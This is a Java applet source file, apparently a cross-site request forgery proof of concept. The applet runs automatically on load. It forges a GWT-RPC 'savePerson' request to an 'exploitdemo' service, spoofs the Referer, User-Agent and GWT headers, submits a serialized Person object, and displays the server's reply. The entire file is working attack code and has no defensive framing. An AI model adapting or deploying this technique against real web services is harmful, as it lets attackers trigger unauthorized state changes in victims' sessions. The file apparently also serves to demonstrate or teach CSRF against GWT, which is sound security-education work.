import java.applet.Applet;
import java.awt.TextArea;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.URL;
import java.net.URLConnection;


public class XsrfApplet extends Applet{
	private final TextArea outputArea = new TextArea(60,40);
	public void init(){
		add(outputArea);
		try {
			URL url = new URL("http://www2.jluehr.de:8080/ed/exploitdemo/person-service");
			String data = "7|0|7|http://www2.jluehr.de:8080/ed/exploitdemo/|B66D84EFF7710C04CCFB5CB3D2FD2E9E|jan.edu.ed.client.services.PersonService|savePerson|jan.edu.ed.shared.model.Person/3517128213|Blub|Blob|1|2|3|4|1|5|5|6|7|1|0|";
			URLConnection conn = url.openConnection();
			conn.setRequestProperty("X-GWT-Permutation", "473A6C68AD55331F387E3635F1083A49");
			conn.setRequestProperty("X-GWT-Module-Base", "http://www2.jluehr.de:8080/ed/exploitdemo/");
			conn.setRequestProperty("Referer", "http://www2.jluehr.de:8080/ed/");
			conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0.1) Gecko/20100101 Firefox/5.0.1");
			conn.setRequestProperty("Content-Type", "text/x-gwt-rpc; charset=utf-8");
			
			conn.setDoOutput(true);
		    OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
		    wr.write(data);
		    wr.flush();
		    BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
		    String line;
		    while ((line = rd.readLine()) != null) {
		        outputArea.append(line);
		    	System.out.println(line);
		    
		    }
		    wr.close();
		    rd.close();
		    
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	public static void main(String [] args){
		new XsrfApplet().init();
	}
}
